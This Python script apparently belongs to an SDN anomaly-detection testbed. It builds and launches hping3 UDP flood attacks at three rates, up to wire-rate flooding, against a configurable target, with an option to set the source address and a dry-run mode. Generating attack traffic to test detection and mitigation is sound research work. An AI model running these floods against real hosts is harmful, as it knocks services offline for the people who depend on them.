#!/usr/bin/env python3
"""
UDP Flood Attack Generator for SDN Telemetry & Anomaly Detection Testbed.

Generates UDP flood attacks at low, medium, and high traffic rates against target hosts.
Complies with requirement R7:
- Low rate: 100 pps, 512B payload (hping3 --udp -p 5001 -i u10000 -d 512 <target_ip>)
- Medium rate: 1,000 pps, 512B payload (hping3 --udp -p 5001 -i u1000 -d 512 <target_ip>)
- High rate: Wire rate, 1KB payload (hping3 --udp -p 5001 --flood -d 1024 <target_ip>)
- Uses explicit host source IP (e.g. 10.0.0.1) without --rand-source for deterministic mitigation attribution.
"""

import argparse
import logging
import os
import shutil
import signal
import subprocess
import sys
import time
from typing import Any, Dict, List, Optional

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] [udp_flood] %(message)s")
logger = logging.getLogger("udp_flood")

RATE_CONFIGS = {
    "low": {
        "rate_args": ["-i", "u10000"],
        "payload_size": 512,
        "target_pps": 100,
        "description": "100 pps, 512B payload low-rate UDP flood"
    },
    "medium": {
        "rate_args": ["-i", "u1000"],
        "payload_size": 512,
        "target_pps": 1000,
        "description": "1,000 pps, 512B payload medium-rate UDP flood"
    },
    "high": {
        "rate_args": ["--flood"],
        "payload_size": 1024,
        "target_pps": 50000,
        "description": "Wire-rate, 1KB payload high-rate UDP flood"
    }
}


def build_hping3_udp_command(
    target_ip: str,
    rate: str = "medium",
    target_port: int = 5001,
    source_ip: Optional[str] = "10.0.0.1",
    payload_size: Optional[int] = None,
    count: Optional[int] = None
) -> List[str]:
    """
    Construct the hping3 command line arguments for UDP flood.
    """
    rate_key = rate.lower()
    if rate_key not in RATE_CONFIGS:
        raise ValueError(f"Invalid rate '{rate}'. Allowed values: {list(RATE_CONFIGS.keys())}")

    config = RATE_CONFIGS[rate_key]
    data_size = payload_size if payload_size is not None else config["payload_size"]

    cmd = ["hping3", "--udp", "-p", str(target_port)]
    cmd.extend(config["rate_args"])
    cmd.extend(["-d", str(data_size)])

    if source_ip:
        # Explicit source IP for deterministic mitigation attribution (NO --rand-source)
        cmd.extend(["-a", source_ip])

    if count is not None and count > 0:
        cmd.extend(["-c", str(count)])

    cmd.append(target_ip)
    return cmd


def udp_flood(
    target_ip: str = "10.0.0.2",
    rate: str = "medium",
    duration: int = 30,
    source_ip: Optional[str] = "10.0.0.1",
    target_port: int = 5001,
    payload_size: Optional[int] = None,
    host: Any = None,
    dry_run: bool = False
) -> Dict[str, Any]:
    """
    Execute a UDP flood attack against target_ip.

    :param target_ip: IP address of the victim host (e.g. 10.0.0.2)
    :param rate: Traffic rate profile ('low', 'medium', 'high')
    :param duration: Attack duration in seconds
    :param source_ip: Source IP address of the attacker (e.g. 10.0.0.1)
    :param target_port: Destination UDP port (default: 5001)
    :param payload_size: Optional custom payload size in bytes
    :param host: Optional Mininet Host object if running inside host namespace
    :param dry_run: If True or if hping3 is unavailable, simulate the attack
    :return: Dictionary containing execution summary
    """
    cmd_args = build_hping3_udp_command(target_ip, rate, target_port, source_ip, payload_size)
    cmd_str = " ".join(cmd_args)
    rate_info = RATE_CONFIGS[rate.lower()]
    effective_payload = payload_size if payload_size is not None else rate_info["payload_size"]
    estimated_pps = rate_info["target_pps"]
    estimated_packets = estimated_pps * duration
    estimated_bytes = estimated_packets * (effective_payload + 28)  # including IP/UDP headers

    hping3_available = shutil.which("hping3") is not None
    should_dry_run = dry_run or (not hping3_available and host is None)

    start_time = time.time()
    result = {
        "attack_type": "udp_flood",
        "target_ip": target_ip,
        "target_port": target_port,
        "rate": rate,
        "payload_size": effective_payload,
        "duration": duration,
        "source_ip": source_ip,
        "command": cmd_str,
        "estimated_packets": estimated_packets,
        "estimated_bytes": estimated_bytes,
        "start_time": start_time,
        "end_time": None,
        "elapsed_sec": 0.0,
        "packets_sent": 0,
        "status": "pending",
        "error": None
    }

    logger.info(
        f"Initiating UDP flood: target={target_ip}:{target_port}, rate={rate} "
        f"({rate_info['description']}), payload={effective_payload}B, duration={duration}s, source={source_ip}"
    )

    if should_dry_run:
        logger.info(f"Executing in dry-run/simulation mode (hping3 available: {hping3_available})")
        sim_sleep = min(duration, 0.5) if duration > 0 else 0
        if sim_sleep > 0:
            time.sleep(sim_sleep)
        end_time = time.time()
        result.update({
            "end_time": end_time,
            "elapsed_sec": end_time - start_time,
            "packets_sent": estimated_packets,
            "status": "success",
            "dry_run": True
        })
        logger.info(f"UDP flood completed (simulated): {estimated_packets} packets ({estimated_bytes} bytes)")
        return result

    # Live execution
    try:
        if host is not None:
            logger.info(f"Executing command on Mininet host {getattr(host, 'name', host)}: {cmd_str}")
            proc = host.popen(cmd_args, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            time.sleep(duration)
            if proc.poll() is None:
                proc.send_signal(signal.SIGINT)
                try:
                    stdout, stderr = proc.communicate(timeout=3)
                except subprocess.TimeoutExpired:
                    proc.kill()
                    stdout, stderr = proc.communicate()
            else:
                stdout, stderr = proc.communicate()
        else:
            logger.info(f"Executing local subprocess: {cmd_str}")
            proc = subprocess.Popen(
                cmd_args,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            time.sleep(duration)
            if proc.poll() is None:
                proc.send_signal(signal.SIGINT)
                try:
                    stdout, stderr = proc.communicate(timeout=3)
                except subprocess.TimeoutExpired:
                    proc.kill()
                    stdout, stderr = proc.communicate()
            else:
                stdout, stderr = proc.communicate()

        end_time = time.time()
        elapsed = end_time - start_time
        result.update({
            "end_time": end_time,
            "elapsed_sec": elapsed,
            "packets_sent": estimated_packets,
            "status": "success",
            "dry_run": False
        })
        logger.info(f"UDP flood finished: elapsed={elapsed:.2f}s")
    except Exception as e:
        end_time = time.time()
        logger.error(f"UDP flood failed: {e}")
        result.update({
            "end_time": end_time,
            "elapsed_sec": end_time - start_time,
            "status": "failed",
            "error": str(e)
        })

    return result


def run_attack(*args, **kwargs) -> Dict[str, Any]:
    """Compatibility wrapper for run_attack API."""
    return udp_flood(*args, **kwargs)


class UDPFloodAttack:
    """Object-oriented wrapper for UDP Flood Attack."""

    def __init__(
        self,
        target_ip: str = "10.0.0.2",
        rate: str = "medium",
        duration: int = 30,
        source_ip: str = "10.0.0.1",
        target_port: int = 5001,
        payload_size: Optional[int] = None
    ):
        self.target_ip = target_ip
        self.rate = rate
        self.duration = duration
        self.source_ip = source_ip
        self.target_port = target_port
        self.payload_size = payload_size

    def execute(self, host: Any = None, dry_run: bool = False) -> Dict[str, Any]:
        return udp_flood(
            target_ip=self.target_ip,
            rate=self.rate,
            duration=self.duration,
            source_ip=self.source_ip,
            target_port=self.target_port,
            payload_size=self.payload_size,
            host=host,
            dry_run=dry_run
        )


def main():
    parser = argparse.ArgumentParser(description="SDN Testbed UDP Flood Generator (hping3)")
    parser.add_argument("--target", default="10.0.0.2", help="Victim target IP (default: 10.0.0.2)")
    parser.add_argument("--port", type=int, default=5001, help="Victim UDP port (default: 5001)")
    parser.add_argument("--rate", choices=["low", "medium", "high"], default="medium", help="Rate profile (default: medium)")
    parser.add_argument("--payload-size", type=int, default=None, help="Custom payload size in bytes")
    parser.add_argument("--duration", type=int, default=30, help="Duration in seconds (default: 30)")
    parser.add_argument("--source", default="10.0.0.1", help="Attacker source IP (default: 10.0.0.1)")
    parser.add_argument("--dry-run", action="store_true", help="Dry run simulation mode")

    args = parser.parse_args()
    res = udp_flood(
        target_ip=args.target,
        rate=args.rate,
        duration=args.duration,
        source_ip=args.source,
        target_port=args.port,
        payload_size=args.payload_size,
        dry_run=args.dry_run
    )
    print(f"Result: {res['status']}, elapsed={res['elapsed_sec']:.2f}s, packets={res['packets_sent']}")
    if res["status"] != "success":
        sys.exit(1)


if __name__ == "__main__":
    main()
